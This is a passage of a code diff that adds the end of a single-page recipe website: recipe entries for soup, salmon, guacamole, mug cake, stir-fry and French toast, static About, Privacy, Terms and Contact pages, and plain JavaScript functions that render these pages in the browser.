+<p>Pour batter into the prepared pan. Bake for 55–65 minutes, or until a toothpick inserted in the center comes out clean. Let cool in the pan for 10 minutes before turning out onto a wire rack.</p>
+
+<p style="background:#F0F7E6;border-left:4px solid #4D7C0F;padding:16px 18px;border-radius:10px;margin:22px 0;color:#292524;"><strong>Pro Tip:</strong> The riper the bananas, the better the bread. Completely black, mushy bananas give the sweetest, most intense banana flavor.</p>
+
+<div style="background:#FFF7ED;border:1px solid #FED7AA;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:1.4rem;line-height:1.4;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Prep Time: 10 minutes</li>
+    <li>Bake Time: 60 minutes</li>
+    <li>Servings: 10 slices</li>
+    <li>Difficulty: Easy</li>
+  </ul>
+</div>`
+            },
+            {
+                id: 'tomato-soup',
+                title: 'Creamy Tomato Soup',
+                date: 'May 16, 2026',
+                emoji: '🍅',
+                tag: '🥣 Soup',
+                excerpt: 'Velvety smooth and deeply comforting, this creamy tomato soup is made from canned tomatoes, fresh garlic, and a touch of cream. Ready in 30 minutes, it pairs perfectly with a golden grilled cheese sandwich for the ultimate cozy meal.',
+                content: `<p>There's a reason tomato soup is the world's favorite comfort food. This homemade version is miles ahead of anything from a can — rich, silky, and bursting with real tomato flavor. A touch of cream and fresh basil elevates it to something truly special.</p>
+
+<div style="background:#FFF7ED;border:1px solid #FED7AA;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:1.4rem;line-height:1.4;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">Ingredients</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>2 cans (28 oz each) whole peeled tomatoes</li>
+    <li>1 medium onion, chopped</li>
+    <li>4 cloves garlic, minced</li>
+    <li>2 tablespoons olive oil</li>
+    <li>2 tablespoons butter</li>
+    <li>1 cup vegetable or chicken broth</li>
+    <li>½ cup heavy cream</li>
+    <li>1 teaspoon sugar</li>
+    <li>Fresh basil leaves</li>
+    <li>Salt and pepper to taste</li>
+  </ul>
+</div>
+
+<h2 style="font-size:1.8rem;line-height:1.3;margin:36px 0 18px;color:#292524;border-bottom:2px solid #F0E4D8;padding-bottom:10px;font-weight:700;">Instructions</h2>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">1. Sauté Aromatics</h3>
+<p>Heat olive oil and butter in a large pot over medium heat. Add chopped onion and cook for 5 minutes until soft and translucent. Add minced garlic and cook for 1 minute.</p>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">2. Simmer the Tomatoes</h3>
+<p>Add the canned tomatoes (with juices), broth, and sugar. Bring to a boil, then reduce heat and simmer for 15 minutes. Add a handful of fresh basil leaves.</p>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">3. Blend Until Smooth</h3>
+<p>Using an immersion blender (or transfer to a regular blender in batches), purée the soup until completely smooth and velvety. Stir in the heavy cream. Season with salt and pepper.</p>
+
+<p style="background:#F0F7E6;border-left:4px solid #4D7C0F;padding:16px 18px;border-radius:10px;margin:22px 0;color:#292524;"><strong>Pro Tip:</strong> A pinch of sugar isn't for sweetness — it balances the acidity of the tomatoes and rounds out the overall flavor beautifully.</p>
+
+<div style="background:#FFF7ED;border:1px solid #FED7AA;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:1.4rem;line-height:1.4;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Total Time: 30 minutes</li>
+    <li>Servings: 6</li>
+    <li>Difficulty: Easy</li>
+    <li>Perfect With: Grilled cheese sandwiches</li>
+  </ul>
+</div>`
+            },
+            {
+                id: 'honey-garlic-salmon',
+                title: 'Honey Garlic Glazed Salmon',
+                date: 'June 01, 2026',
+                emoji: '🐟',
+                tag: '🍽️ Dinner',
+                excerpt: 'Restaurant-quality salmon at home in just 20 minutes! Tender fillets are pan-seared to perfection and coated in a sticky, caramelized honey garlic glaze. The sweet and savory balance is absolutely addictive. Serve with steamed broccoli and jasmine rice for a complete meal.',
+                content: `<p>This honey garlic glazed salmon looks and tastes like something from a fine dining restaurant, but it takes just 20 minutes and a single skillet. The glaze caramelizes into a sticky, glossy coating that makes every bite irresistible.</p>
+
+<div style="background:#FFF7ED;border:1px solid #FED7AA;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:1.4rem;line-height:1.4;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">Ingredients</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>4 salmon fillets (6 oz each)</li>
+    <li>3 tablespoons honey</li>
+    <li>2 tablespoons soy sauce</li>
+    <li>4 cloves garlic, minced</li>
+    <li>1 tablespoon olive oil</li>
+    <li>1 tablespoon butter</li>
+    <li>Juice of ½ lemon</li>
+    <li>Salt and pepper</li>
+    <li>Sesame seeds and green onions for garnish</li>
+  </ul>
+</div>
+
+<h2 style="font-size:1.8rem;line-height:1.3;margin:36px 0 18px;color:#292524;border-bottom:2px solid #F0E4D8;padding-bottom:10px;font-weight:700;">Instructions</h2>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">1. Prepare the Glaze</h3>
+<p>In a small bowl, whisk together honey, soy sauce, minced garlic, and lemon juice. Set aside.</p>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">2. Sear the Salmon</h3>
+<p>Pat salmon fillets dry and season with salt and pepper. Heat olive oil in a skillet over medium-high heat. Place salmon skin-side up and sear for 4 minutes until a golden crust forms. Flip carefully.</p>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">3. Glaze and Finish</h3>
+<p>Reduce heat to medium-low. Add butter to the pan, then pour the honey garlic mixture over the salmon. Cook for 3–4 minutes, spooning the glaze over the fillets repeatedly until the sauce thickens and the salmon is cooked through.</p>
+
+<p style="background:#F0F7E6;border-left:4px solid #4D7C0F;padding:16px 18px;border-radius:10px;margin:22px 0;color:#292524;"><strong>Pro Tip:</strong> Don't move the salmon after placing it in the pan. Let it develop a proper crust undisturbed — that's where the texture and flavor come from.</p>
+
+<div style="background:#FFF7ED;border:1px solid #FED7AA;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:1.4rem;line-height:1.4;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Total Time: 20 minutes</li>
+    <li>Servings: 4</li>
+    <li>Difficulty: Easy</li>
+    <li>Serve With: Jasmine rice and steamed broccoli</li>
+  </ul>
+</div>`
+            },
+            {
+                id: 'guacamole',
+                title: 'Perfect Homemade Guacamole',
+                date: 'June 20, 2026',
+                emoji: '🥑',
+                tag: '🌮 Snack',
+                excerpt: 'Forget store-bought — real guacamole takes just 10 minutes and a fork! Ripe avocados, lime juice, cilantro, red onion, and a kick of jalapeño come together in a chunky, zesty dip that disappears faster than you can make it. Perfect for chips, tacos, or straight from the bowl.',
+                content: `<p>Great guacamole is all about balance: creamy avocado, bright lime, pungent onion, fresh cilantro, and just enough heat. This recipe keeps it chunky and authentic — no blenders, no fancy equipment, just a fork and five minutes.</p>
+
+<div style="background:#FFF7ED;border:1px solid #FED7AA;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:1.4rem;line-height:1.4;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">Ingredients</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>3 ripe avocados</li>
+    <li>Juice of 1 lime</li>
+    <li>¼ cup finely diced red onion</li>
+    <li>2 tablespoons fresh cilantro, chopped</li>
+    <li>1 small jalapeño, seeded and minced</li>
+    <li>1 small tomato, diced (optional)</li>
+    <li>½ teaspoon salt</li>
+    <li>Pinch of cumin</li>
+  </ul>
+</div>
+
+<h2 style="font-size:1.8rem;line-height:1.3;margin:36px 0 18px;color:#292524;border-bottom:2px solid #F0E4D8;padding-bottom:10px;font-weight:700;">Instructions</h2>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">1. Mash the Avocados</h3>
+<p>Halve and pit the avocados. Scoop the flesh into a bowl. Mash with a fork to your preferred texture — some like it smooth, but chunky is traditional and gives the best mouthfeel.</p>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">2. Add the Fresh Ingredients</h3>
+<p>Stir in lime juice immediately (this prevents browning). Fold in the diced onion, cilantro, jalapeño, tomato, salt, and cumin. Taste and adjust lime and salt to your liking.</p>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">3. Serve Fresh</h3>
+<p>Serve immediately with tortilla chips, alongside tacos, or as a topping for grilled meats. If you must store it, press plastic wrap directly onto the surface to prevent browning.</p>
+
+<p style="background:#F0F7E6;border-left:4px solid #4D7C0F;padding:16px 18px;border-radius:10px;margin:22px 0;color:#292524;"><strong>Pro Tip:</strong> To check if an avocado is ripe, pop off the small stem. If it's green underneath, it's perfect. If it's brown, it's overripe.</p>
+
+<div style="background:#FFF7ED;border:1px solid #FED7AA;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:1.4rem;line-height:1.4;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Total Time: 10 minutes</li>
+    <li>Servings: 6</li>
+    <li>Difficulty: Very Easy</li>
+    <li>Best For: Parties, game day, taco night</li>
+  </ul>
+</div>`
+            },
+            {
+                id: 'chocolate-mug-cake',
+                title: 'Chocolate Mug Cake',
+                date: 'July 08, 2026',
+                emoji: '🍫',
+                tag: '🧁 Baking',
+                excerpt: 'Craving chocolate cake but don\'t want to wait? This single-serving mug cake is ready in just 5 minutes — 3 minutes to mix and 90 seconds in the microwave. Rich, fudgy, and deeply chocolatey, it satisfies even the most intense sweet tooth on demand.',
+                content: `<p>The chocolate mug cake is the greatest dessert hack ever invented. When a chocolate craving strikes at 10 PM and you don't want to bake an entire cake, this miraculous mug of fudgy goodness is your answer. Five minutes, one mug, zero regrets.</p>
+
+<div style="background:#FFF7ED;border:1px solid #FED7AA;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:1.4rem;line-height:1.4;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">Ingredients</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>4 tablespoons all-purpose flour</li>
+    <li>4 tablespoons sugar</li>
+    <li>2 tablespoons unsweetened cocoa powder</li>
+    <li>1 egg</li>
+    <li>3 tablespoons milk</li>
+    <li>3 tablespoons vegetable oil</li>
+    <li>Splash of vanilla extract</li>
+    <li>Pinch of salt</li>
+    <li>2 tablespoons chocolate chips (optional)</li>
+  </ul>
+</div>
+
+<h2 style="font-size:1.8rem;line-height:1.3;margin:36px 0 18px;color:#292524;border-bottom:2px solid #F0E4D8;padding-bottom:10px;font-weight:700;">Instructions</h2>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">1. Mix Everything in the Mug</h3>
+<p>In a large microwave-safe mug, add flour, sugar, cocoa powder, and salt. Stir with a fork. Add the egg and mix thoroughly. Pour in the milk, oil, and vanilla. Stir until smooth with no lumps. Drop in chocolate chips if desired.</p>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">2. Microwave</h3>
+<p>Microwave on high for 70–90 seconds. The cake will rise above the rim of the mug — that's normal! It should be set on top but slightly gooey in the center.</p>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">3. Top and Enjoy</h3>
+<p>Let it cool for 1 minute (it's lava-hot!). Top with a scoop of vanilla ice cream, whipped cream, or a dusting of powdered sugar. Eat straight from the mug with a spoon.</p>
+
+<p style="background:#F0F7E6;border-left:4px solid #4D7C0F;padding:16px 18px;border-radius:10px;margin:22px 0;color:#292524;"><strong>Pro Tip:</strong> Don't overcook! The center should be slightly underdone when you take it out — residual heat will continue cooking it. An overcooked mug cake becomes rubbery.</p>
+
+<div style="background:#FFF7ED;border:1px solid #FED7AA;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:1.4rem;line-height:1.4;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Total Time: 5 minutes</li>
+    <li>Servings: 1</li>
+    <li>Difficulty: Very Easy</li>
+    <li>Equipment: Microwave and a mug</li>
+  </ul>
+</div>`
+            },
+            {
+                id: 'stir-fry-vegetables',
+                title: 'Quick Veggie Stir-Fry',
+                date: 'July 25, 2026',
+                emoji: '🥦',
+                tag: '🥬 Healthy',
+                excerpt: 'Colorful, crunchy, and ready in 15 minutes! This veggie stir-fry tosses crisp bell peppers, broccoli, snap peas, and carrots in a savory soy-ginger sauce. It works as a light main dish or a perfect side. Add tofu, chicken, or shrimp to make it a full meal.',
+                content: `<p>A good stir-fry is all about high heat, fast cooking, and bold sauce. This veggie version celebrates the natural sweetness and crunch of fresh vegetables, coated in a glossy soy-ginger sauce that clings to every piece.</p>
+
+<div style="background:#FFF7ED;border:1px solid #FED7AA;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:1.4rem;line-height:1.4;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">Ingredients</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>2 cups broccoli florets</li>
+    <li>1 red bell pepper, sliced</li>
+    <li>1 cup snap peas</li>
+    <li>1 large carrot, julienned</li>
+    <li>3 tablespoons soy sauce</li>
+    <li>1 tablespoon sesame oil</li>
+    <li>1 tablespoon honey or brown sugar</li>
+    <li>1 tablespoon fresh ginger, grated</li>
+    <li>2 cloves garlic, minced</li>
+    <li>1 tablespoon cornstarch + 2 tablespoons water</li>
+    <li>2 tablespoons vegetable oil</li>
+    <li>Sesame seeds and green onions for garnish</li>
+  </ul>
+</div>
+
+<h2 style="font-size:1.8rem;line-height:1.3;margin:36px 0 18px;color:#292524;border-bottom:2px solid #F0E4D8;padding-bottom:10px;font-weight:700;">Instructions</h2>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">1. Prepare the Sauce</h3>
+<p>Whisk together soy sauce, sesame oil, honey, ginger, garlic, and the cornstarch slurry in a small bowl. Set aside.</p>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">2. Stir-Fry the Vegetables</h3>
+<p>Heat vegetable oil in a wok or large skillet over high heat until smoking. Add broccoli and carrots first (they take longest). Stir-fry for 2 minutes, then add bell pepper and snap peas. Cook for another 2 minutes, tossing constantly.</p>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">3. Add Sauce and Serve</h3>
+<p>Pour the sauce over the vegetables and toss for 1 minute until the sauce thickens and glazes everything evenly. Serve immediately over steamed rice, garnished with sesame seeds and sliced green onions.</p>
+
+<p style="background:#F0F7E6;border-left:4px solid #4D7C0F;padding:16px 18px;border-radius:10px;margin:22px 0;color:#292524;"><strong>Pro Tip:</strong> The number one stir-fry mistake is overcrowding the pan. If your pan isn't big enough, cook in two batches. Vegetables should sear, not steam.</p>
+
+<div style="background:#FFF7ED;border:1px solid #FED7AA;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:1.4rem;line-height:1.4;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Total Time: 15 minutes</li>
+    <li>Servings: 4</li>
+    <li>Difficulty: Easy</li>
+    <li>Add-ons: Tofu, chicken, or shrimp</li>
+  </ul>
+</div>`
+            },
+            {
+                id: 'french-toast',
+                title: 'Cinnamon French Toast',
+                date: 'August 12, 2026',
+                emoji: '🍞',
+                tag: '☀️ Breakfast',
+                excerpt: 'Golden, custardy, and dusted with cinnamon sugar — this French toast is breakfast perfection. Thick slices of bread are soaked in a rich egg-and-milk mixture, then pan-fried to a beautiful golden-brown. A weekend brunch essential that the whole family will love.',
+                content: `<p>French toast transforms ordinary bread into something extraordinary. The secret is in the custard soak — a perfect blend of eggs, milk, vanilla, and cinnamon that creates that irresistible golden exterior and soft, creamy interior.</p>
+
+<div style="background:#FFF7ED;border:1px solid #FED7AA;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:1.4rem;line-height:1.4;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">Ingredients</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>6 thick slices of bread (brioche or challah works best)</li>
+    <li>3 large eggs</li>
+    <li>¾ cup whole milk</li>
+    <li>1 teaspoon vanilla extract</li>
+    <li>1 teaspoon ground cinnamon</li>
+    <li>2 tablespoons butter for cooking</li>
+    <li>Maple syrup for serving</li>
+    <li>Powdered sugar for dusting</li>
+    <li>Fresh berries (optional)</li>
+  </ul>
+</div>
+
+<h2 style="font-size:1.8rem;line-height:1.3;margin:36px 0 18px;color:#292524;border-bottom:2px solid #F0E4D8;padding-bottom:10px;font-weight:700;">Instructions</h2>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">1. Make the Custard</h3>
+<p>In a shallow dish, whisk together eggs, milk, vanilla, and cinnamon until fully combined and smooth.</p>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">2. Soak the Bread</h3>
+<p>Dip each slice of bread into the custard mixture, letting it soak for 15–20 seconds per side. You want it thoroughly coated but not falling apart.</p>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">3. Cook Until Golden</h3>
+<p>Melt butter on a griddle or skillet over medium heat. Cook each slice for 2–3 minutes per side until golden brown and slightly crispy on the edges.</p>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">4. Serve Warm</h3>
+<p>Stack the French toast, dust with powdered sugar, drizzle with maple syrup, and add fresh berries on top. Serve immediately while warm and custardy.</p>
+
+<p style="background:#F0F7E6;border-left:4px solid #4D7C0F;padding:16px 18px;border-radius:10px;margin:22px 0;color:#292524;"><strong>Pro Tip:</strong> Day-old bread actually makes the best French toast. It's firmer and absorbs the custard without getting soggy. If your bread is fresh, lightly toast it first.</p>
+
+<div style="background:#FFF7ED;border:1px solid #FED7AA;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:1.4rem;line-height:1.4;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Prep Time: 5 minutes</li>
+    <li>Cook Time: 15 minutes</li>
+    <li>Servings: 6 slices</li>
+    <li>Difficulty: Easy</li>
+  </ul>
+</div>`
+            }
+        ];
+
+        // Static pages content
+        const staticPages = {
+            about: {
+                title: 'About Us',
+                content: `<h2>About Easy Recipes Kitchen</h2>
+                <p>Welcome to Easy Recipes Kitchen — your home for simple, delicious, and approachable cooking. We believe that great food doesn't require culinary school or fancy equipment. Just quality ingredients, clear instructions, and a little love.</p>
+                <p>Every recipe on our site is tested multiple times to ensure it works perfectly in a real home kitchen. Whether you're a college student making your first meal or a busy parent looking for quick weeknight dinners, we've got you covered.</p>
+                <p>Our mission is simple: make home cooking joyful, accessible, and rewarding for everyone. Happy cooking! 🍳</p>`
+            },
+            privacy: {
+                title: 'Privacy Policy',
+                content: `<h2>Privacy Policy</h2>
+                <p>Your privacy matters to us. Easy Recipes Kitchen is a simple recipe website that does not collect personal information, use tracking cookies, or share data with third parties.</p>
+                <p>This is a static website with no accounts, forms, or data collection mechanisms. We simply share recipes for everyone to enjoy.</p>
+                <p>If you have any questions about this policy, feel free to reach out via our Contact page.</p>
+                <p><em>Last updated: September 2026</em></p>`
+            },
+            terms: {
+                title: 'Terms of Service',
+                content: `<h2>Terms of Service</h2>
+                <p>By using Easy Recipes Kitchen, you agree to these simple terms:</p>
+                <ul>
+                    <li>All recipes are provided for personal, non-commercial use.</li>
+                    <li>Recipe content is original and intended for home cooking guidance.</li>
+                    <li>We are not responsible for any kitchen mishaps — always practice safe cooking!</li>
+                    <li>Feel free to share links to our recipes, but please don't copy entire recipes without attribution.</li>
+                </ul>
+                <p><em>Last updated: September 2026</em></p>`
+            },
+            contact: {
+                title: 'Contact Us',
+                content: `<h2>Get in Touch</h2>
+                <p>We'd love to hear from you! Whether you have a recipe request, feedback, or just want to say hello, drop us a line.</p>
+                <p>📧 <strong>Email:</strong> hello@easyrecipes.kitchen</p>
+                <p>🐦 <strong>Social:</strong> @EasyRecipesKitchen</p>
+                <p>We typically respond within 24–48 hours. Happy cooking! 👨‍🍳</p>`
+            }
+        };
+
+        const app = document.getElementById('app');
+
+        function navigate(view, param) {
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+
+            // Remove all active states
+            document.querySelectorAll('.top-nav a').forEach(a => a.classList.remove('active'));
+
+            if (view === 'home') {
+                document.getElementById('nav-home').classList.add('active');
+                renderHome();
+            } else if (view === 'post') {
+                document.getElementById('nav-home').classList.add('active');
+                renderPost(param);
+            } else if (view === 'page') {
+                const navEl = document.getElementById('nav-' + param);
+                if (navEl) navEl.classList.add('active');
+                renderStaticPage(param);
+            }
+        }
+
+        function renderHome() {
+            let html = '';
+            posts.forEach(post => {
+                html += `
+                <article class="post-card" onclick="navigate('post', '${post.id}')">
+                    <div class="post-header">
+                        <div class="author-box">
+                            <div class="avatar">👨‍🍳</div>
+                            <div class="author-info">
+                                <span class="username">Easy Recipes</span>
+                                <span class="user-role">Home Chef</span>
+                            </div>
+                        </div>
+                        <span class="post-tag-pill">${post.tag}</span>
+                    </div>
+                    <div class="image-wrapper">
+                        <div class="image-placeholder">${post.emoji}</div>
+                    </div>
+                    <div class="post-content">
+                        <h2>${post.title}</h2>
+                        <p class="card-excerpt">${post.excerpt}</p>
+                        <span class="read-more-btn">View Full Recipe →</span>
+                    </div>
+                    <div class="post-footer">
+                        <div class="post-date-wrapper">📅 ${post.date}</div>
+                        <div class="post-actions">
+                            <span class="post-action-btn" title="Save">🔖</span>
+                            <span class="post-action-btn" title="Share">↗️</span>
+                        </div>
+                    </div>
+                </article>`;
+            });
+            app.innerHTML = html;
+        }
+
+        function renderPost(postId) {
+            const post = posts.find(p => p.id === postId);
+            if (!post) {
+                navigate('home');
+                return;
+            }
+
+            app.innerHTML = `
+            <a class="back-button" onclick="navigate('home')">← Back to All Recipes</a>
+            <article class="single-post">
+                <div class="post-header">
+                    <div class="author-box">
+                        <div class="avatar">👨‍🍳</div>
+                        <div class="author-info">
+                            <span class="username">Easy Recipes</span>
+                            <span class="user-role">Home Chef</span>
+                        </div>
+                    </div>
+                    <span class="post-tag-pill">${post.tag}</span>
+                </div>
+                <div class="image-wrapper">
+                    <div class="image-placeholder">${post.emoji}</div>
+                </div>
+                <div class="post-content">
+                    <h1>${post.title}</h1>
+                    ${post.content}
+                </div>
+                <div class="post-footer">
+                    <div class="post-date-wrapper">📅 ${post.date}</div>
+                    <div class="post-actions">
+                        <span class="post-action-btn" title="Save">🔖</span>
+                        <span class="post-action-btn" title="Share">↗️</span>
+                    </div>
+                </div>
+            </article>`;
+        }
+
+        function renderStaticPage(pageId) {
+            const page = staticPages[pageId];
+            if (!page) {
+                navigate('home');
+                return;
+            }
+
+            app.innerHTML = `
+            <a class="back-button" onclick="navigate('home')">← Back to Recipes</a>
+            <div class="static-page">
+                ${page.content}
+            </div>`;
+        }
+
+        // Initial render
+        navigate('home');
+    </script>
+</body>
+</html>
